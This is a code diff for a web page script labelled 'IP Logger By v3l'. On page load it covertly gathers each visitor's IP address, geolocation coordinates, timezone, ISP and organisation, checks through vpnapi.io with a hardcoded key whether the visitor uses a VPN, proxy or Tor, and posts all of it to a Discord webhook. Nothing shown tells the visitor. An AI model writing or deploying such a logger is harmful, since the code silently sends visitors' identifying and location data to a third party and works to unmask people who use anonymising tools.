@@ -41,35 +41,59 @@
         const webhookUrl = document.querySelector('meta[name="discord-webhook"]').content;
   // create the embed message
   // create the embed message
-  const embed = {
-    title: 'IP Log',
-    description: `
-      **IP Logger By v3l**
-      Adresse IP: ${ip}
-      Pays: ${country}
-      Drapeau: ${flag}
-      Code Raccourci Du Pays: ${countrycode}
-      Geo Code Du Pays: ${countrygeo}
-      Continent: ${continent}
-      Code du Continent: ${continentcode}
-      ID Geo du Continent: ${continentgeo}
-      X: ${longitude}
-      Y: ${latitude}
-      Nom du TimeZone: ${timezonename}
-      Raccourci du TimeZone: ${nameabbreviation}
-      Heure Actuel: ${currentime}3
-      Monnaie d'échange: ${currency}
-      Nom Raccourci De la monnaie d'échange: ${currencycode}
-      ASO (opérateur): ${operateur}
-      Type de Connexion: ${typedeco}
-      ISP: ${isp}
-      Nom de l'organisation: ${organame}
-    `,
-  };
+const embed1 = {
+  title: 'IP Log',
+  description: `
+    **IP Logger By v3l**
+    Adresse IP: ${ip}
+    Pays: ${country}
+    Drapeau: ${flag}
+    Code Raccourci Du Pays: ${countrycode}
+    Geo Code Du Pays: ${countrygeo}
+    Continent: ${continent}
+    Code du Continent: ${continentcode}
+    ID Geo du Continent: ${continentgeo}
+    X: ${longitude}
+    Y: ${latitude}
+    Nom du TimeZone: ${timezonename}
+    Raccourci du TimeZone: ${nameabbreviation}
+    Heure Actuel: ${currentime}3
+    Monnaie d'échange: ${currency}
+    Nom Raccourci De la monnaie d'échange: ${currencycode}
+    ASO (opérateur): ${operateur}
+    Type de Connexion: ${typedeco}
+    ISP: ${isp}
+    Nom de l'organisation: ${organame}
+  `,
+};
+        
+        $.getJSON("https://vpnapi.io/api/?key=65cc98cf85ec414ea0faaf4e55e8e733", function (data) {
+        // display the IP address on the page
+        const vpn = data.security.vpn
+        const proxy = data.security.proxy
+        const tor = data.security.tor
+        const relay = data.security.relay
 
-  // send the embed message to the Discord channel
-  axios.post(webhookUrl, {
-    embeds: [embed],
-  });
+// create the second embed message
+const embed2 = {
+  title: 'Security Check',
+  description: `
+    **Security Check By v3l**
+    Utilise un VPN? : ${vpn}
+    Utilise un Proxy? : ${proxy}
+    Utilise Tor? : ${tor}
+    Utilise un Relay? : ${relay}
+  `,
+};
+
+// send the first embed message to the Discord channel
+axios.post(webhookUrl, {
+  embeds: [embed1],
+});
+
+// send the second embed message to the Discord channel
+axios.post(webhookUrl, {
+  embeds: [embed2],
+});
 });
   </script>
